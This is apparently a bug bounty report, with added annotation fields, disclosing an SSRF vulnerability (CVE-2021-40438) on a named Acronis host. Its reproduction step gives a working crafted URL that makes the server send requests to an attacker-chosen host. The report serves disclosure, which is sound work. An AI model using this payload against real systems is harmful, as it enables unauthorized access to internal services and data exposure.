title: CVE-2021-40438 on cp-eu2.acronis.com
content:
Hi team
Summary
CVE-2021-40438 on cp-eu2.acronis.com
Steps To Reproduce
https://cp-eu2.acronis.com?unix:|http://YOUR_HOST/
Recommendations
patch apache
Thanks
Impact
ssrf
steps: Observe the SSRF (Server-Side Request Forgery) vulnerability triggered by the crafted URL.
vuln_description: This vulnerability is a Server-Side Request Forgery (SSRF) in cp-eu2.acronis.com, triggered by a specially crafted URL with a long unix parameter. The vulnerability allows an attacker to make the server send requests to internal or external systems, potentially leading to unauthorized access or data exposure.
reason: The attack involves a simple URL manipulation with a long parameter, which is a straightforward and well-known technique for triggering SSRF vulnerabilities. There are no complex interactions or multiple components involved.
